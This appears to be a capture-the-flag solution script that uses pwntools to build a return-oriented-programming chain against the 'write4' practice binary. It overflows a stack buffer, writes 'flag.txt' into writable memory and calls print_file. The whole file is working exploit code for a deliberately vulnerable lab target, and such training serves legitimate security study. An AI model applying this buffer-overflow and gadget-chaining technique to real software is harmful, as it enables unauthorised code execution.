#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
 
payload = cyclic(40, n=8) # 32 bytes of the buffer and 8 bytes for rbp
payload += p64(0x00000000004004e6) # the extra ret instruction
payload += p64(0x0000000000400690) # pop r14; pop r15; ret
payload += p64(0x0000000000601028) # writable memory
payload += b"flag.txt" # r15 contains the string
payload += p64(0x0000000000400628) # mov [r14]; r15; ret
payload += p64(0x0000000000400693) # pop rdi; ret
payload += p64(0x0000000000601028) # rdi contains the address of the string
payload += p64(0x0000000000400620) # call to print_file

p = gdb.debug("./write4")
p.send(payload)
p.interactive()


















